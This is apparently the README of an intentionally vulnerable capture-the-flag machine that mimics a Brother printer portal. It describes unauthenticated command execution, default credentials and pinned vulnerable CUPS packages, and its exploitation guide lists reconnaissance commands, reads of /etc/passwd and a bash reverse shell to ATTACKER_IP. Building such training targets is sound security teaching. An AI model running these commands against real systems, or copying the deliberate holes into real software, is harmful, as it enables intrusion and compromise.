# Brother Printer CTF Portal

A CTF machine that emulates a Brother printer web portal with intentional security vulnerabilities for educational purposes.

## 🎯 CTF Objective

This machine simulates a Brother printer web interface with a critical Remote Code Execution (RCE) vulnerability. Participants need to:

1. **Access the settings page** (home page with anonymous access enabled by default)
2. **Exploit the System Diagnostics tool** to execute arbitrary commands
3. **Use RCE to discover the flag** hidden in the system
4. **Optional:** Login with default credentials (1234567:1234567) to access admin functions

## 🔑 Default Credentials

- **Username:** `1234567`
- **Password:** `1234567`

## 🏴 Flag Information

The flag is hidden in the system and can be discovered through RCE exploitation:
- **Flag Location:** Hidden in system files or environment variables
- **Discovery Method:** Use the System Diagnostics tool to execute commands
- **Hint:** Try commands like `env`, `cat /etc/passwd`, or `find / -name "*flag*"`

## 🚀 Quick Start

### Local Development

1. **Clone the repository:**
   ```bash
   git clone https://github.com/jeffaburke/brother-printer-ctf.git
   cd brother-printer-ctf
   ```

2. **Start the venv:**
   ```bash
   python -m venv venv
   source ./venv/bin/activate
   ```

3. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

4. **Run the application:**
   ```bash
   python app.py
   ```

5. **Access the portal:**
   - Open your browser to `http://localhost:5000`
   - You'll land directly on the Settings page with the System Diagnostics tool
   - Execute commands to discover the hidden flag (no login required by default)
   - Optional: Login with credentials: `1234567` / `1234567` for admin access

### Production Deployment with Ansible

1. **Prepare your inventory.ini file:**
   ```ini
   [all]
   
   <ctf-box-ip>
   ```

2. **Run the Ansible playbook:**
   ```bash
   ansible-playbook -i inventory.ini ansible-playbook.yml
   ```

4. **Access the deployed portal:**
   - Navigate to `http://<ctf-box-ip>`
   - You'll land directly on the Settings page with the System Diagnostics tool
   - Execute commands to discover the hidden flag (no login required by default)
   - Optional: Login for admin access to change settings

## 🏗️ Architecture

### Application Structure
```
brother-printer-ctf/
├── app.py                 # Main Flask application
├── requirements.txt       # Python dependencies
├── templates/            # HTML templates
│   ├── base.html
│   ├── login.html
│   ├── dashboard.html
│   ├── settings.html
│   ├── printer_status.html
│   ├── scan_settings.html
│   ├── network_settings.html
│   └── maintenance.html
├── static/               # Static assets
│   ├── css/
│   │   └── style.css
│   └── js/
│       └── main.js
├── ansible-playbook.yml  # Deployment automation
├── apache-config.conf    # Apache configuration
├── wsgi-entry.py        # WSGI entry point
└── README.md            # This file
```

### Features

#### ✅ Functional Features
- **Anonymous Access:** View settings without login (configurable)
- **Login System:** Default credentials authentication with password change capability
- **Dashboard:** Overview of printer status and quick actions
- **Settings Page:** Home page with system diagnostics tool and RCE vulnerability
- **RCE Vulnerability:** Remote code execution through system diagnostics
- **Access Control:** Admin can enable/disable anonymous access
- **Password Management:** Change admin password functionality
- **Session Management:** Proper login/logout functionality
- **CUPS Integration:** Vulnerable CUPS components with known security issues

#### 🎭 Non-Functional Features (for realism)
- **Printer Status:** Device information and supply levels
- **Scan Settings:** Document scanning configuration
- **Network Settings:** Network configuration and services
- **Maintenance:** System maintenance and firmware updates

## 🔒 Security Vulnerabilities (Intentional)

This CTF machine includes several intentional security issues:

1. **Remote Code Execution (RCE):** System diagnostics tool allows arbitrary command execution
2. **Anonymous Access:** RCE vulnerability accessible without authentication by default
3. **Default Credentials:** Unchanged default login credentials
4. **No Input Validation:** Commands executed without sanitization or validation
5. **CUPS Vulnerabilities:** Multiple known CVEs in CUPS components:
   - **CVE-2022-26691:** cups-browsed privilege escalation
   - **CVE-2022-26692:** libcupsfilters buffer overflow
   - **CVE-2022-26693:** libppd memory corruption
   - **CVE-2022-26694:** foomatic-rip command injection
6. **Security Warnings:** Admin panel shows various security issues
7. **HTTP Only:** No HTTPS encryption (realistic for many printer interfaces)
8. **Verbose Error Messages:** Detailed error information in logs
9. **Privilege Escalation:** Admin functions accessible with default credentials
10. **Outdated Components:** Vulnerable CUPS packages pinned to prevent updates

## 🛠️ Deployment Options

### Option 1: Apache + mod_wsgi (Recommended)
- Uses the provided Ansible playbook
- Production-ready configuration
- Proper process management
- Logging and monitoring
- **Vulnerable CUPS Installation:** CUPS with known vulnerable components
- **Complete Dependencies:** All required packages and libraries with security issues

### Option 2: Standalone Flask
- Good for development and testing
- Simple setup with `python app.py`
- Not recommended for production

### Option 3: Docker (Future Enhancement)
- Containerized deployment
- Easy scaling and management
- Consistent environment

## 📝 Customization

### Changing the Flag
The flag is now hidden in the system. You can modify how it's discovered by:

1. **Environment Variable:** Set a custom environment variable
2. **File-based Flag:** Create a flag file in the system
3. **Custom Command Output:** Modify the RCE to return a custom flag

Example environment variable approach:
```bash
export CTF_FLAG="YourNewFlagHere"
```

### Modifying Default Credentials
Update the constants in `app.py`:
```python
DEFAULT_USERNAME = "your_username"
DEFAULT_PASSWORD = "your_password"
```

### Configuring Anonymous Access
Control anonymous access in `app.py`:
```python
# Set to False to require login for all pages
ANONYMOUS_ACCESS_ENABLED = True
```

### CUPS Configuration
The Ansible playbook automatically installs vulnerable CUPS components for Debian Bookworm:
- **CUPS 2.4.2-3+deb12u9** with known security vulnerabilities
- **cups-browsed 2.0.1-3** with security issues (latest available version)
- **libcupsfilters 2.0.1-3** with vulnerabilities (latest available version)
- **libppd 2.1b1-1** with security flaws (latest available version)
- **foomatic-rip utility** and foomatic-db components with vulnerabilities
- **Package pinning** to prevent automatic security updates for CUPS core

### Adding New Vulnerabilities
- Add new routes in `app.py`
- Create corresponding templates
- Implement intentional security flaws

## 🚨 RCE Exploitation Guide

### Finding the Vulnerability
1. **Access Home Page:** Navigate to the root URL (redirects to settings)
2. **Locate System Diagnostics:** Find the "System Diagnostics" section on the settings page
3. **Identify RCE:** Notice the command execution functionality (no login required)

### Exploitation Techniques
1. **Basic Commands:**
   ```bash
   whoami          # Check current user
   id              # Check user ID and groups
   pwd             # Check current directory
   ls -la          # List files and directories
   ```

2. **System Information:**
   ```bash
   uname -a        # System information
   cat /etc/os-release  # OS version
   ps aux          # Running processes
   netstat -tulpn  # Network connections
   ```

3. **Flag Discovery:**
   ```bash
   env             # Environment variables
   find / -name "*flag*" 2>/dev/null  # Search for flag files
   cat /etc/passwd # User accounts
   cat /proc/version  # Kernel version
   ```

4. **Advanced Techniques:**
   ```bash
   # Reverse shell (if network allows)
   bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
   
   # File system exploration
   find / -type f -name "*.txt" 2>/dev/null | head -20
   
   # Process enumeration
   ps aux | grep -E "(flag|secret|password)"
   ```

5. **CUPS Exploitation:**
   ```bash
   # Check CUPS version and vulnerabilities
   cups-config --version
   dpkg -l | grep cups
   
   # Explore CUPS configuration
   cat /etc/cups/cupsd.conf
   ls -la /etc/cups/
   
   # Check CUPS services and ports
   netstat -tulpn | grep 631
   systemctl status cups
   systemctl status cups-browsed
   
   # Look for CUPS logs and temporary files
   ls -la /var/log/cups/
   ls -la /var/spool/cups/
   ```

## 🎓 Educational Value

This CTF machine teaches:
- **Remote Code Execution (RCE):** Critical vulnerability allowing arbitrary command execution
- **Web Application Security:** Common vulnerabilities in embedded devices
- **Anonymous Access Risks:** Dangers of allowing unauthenticated access to sensitive functions
- **Input Validation:** Importance of sanitizing and validating user input
- **Default Credentials:** Importance of changing default passwords
- **Access Control:** Proper authentication and authorization mechanisms
- **Network Security:** Risks of unencrypted web interfaces
- **Printer Security:** Specific vulnerabilities in network printers
- **CUPS Vulnerabilities:** Real-world CVEs in printing system components
- **Privilege Escalation:** How default credentials can lead to admin access
- **System Exploitation:** Using RCE to discover hidden information
- **Package Management:** Risks of outdated and vulnerable software components

## 🆕 Recent Updates

### Version 2.1 Features
- **RCE Vulnerability:** Critical Remote Code Execution through System Diagnostics tool
- **Hidden Flag:** Flag is no longer visible in SMTP credentials, must be discovered via RCE
- **Anonymous RCE Access:** RCE vulnerability accessible without authentication
- **System Diagnostics:** Professional-looking diagnostic tool that executes arbitrary commands
- **Settings as Home Page:** Direct access to RCE vulnerability from root URL
- **Simplified Interface:** Removed confusing admin section, consolidated functionality
- **Enhanced CTF Challenge:** More realistic and challenging exploitation scenario

### Version 2.0 Features
- **Anonymous Access System:** Users can view settings without login by default
- **Admin Access Control:** Logged-in admins can enable/disable anonymous access
- **Password Management:** Change admin password functionality with validation
- **CUPS Integration:** Vulnerable CUPS components with known security issues
- **Enhanced Security:** More realistic printer interface with proper access controls
- **Improved UI:** Better user experience with conditional content display

### Migration Notes
- **Critical Change:** Flag is now hidden and requires RCE exploitation to discover
- **Default Behavior:** Anonymous access is enabled by default, including RCE vulnerability
- **Home Page:** Root URL now redirects directly to settings page with RCE vulnerability
- **Simplified Interface:** Removed admin section to reduce confusion
- **CTF Impact:** More challenging - participants must exploit RCE to find the flag
- **Admin Functions:** Password changes and access control require authentication
- **CUPS Support:** Full printing system available after deployment

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is for educational purposes only. Use responsibly and only in authorized environments.

---

**Happy Hacking! 🎯**
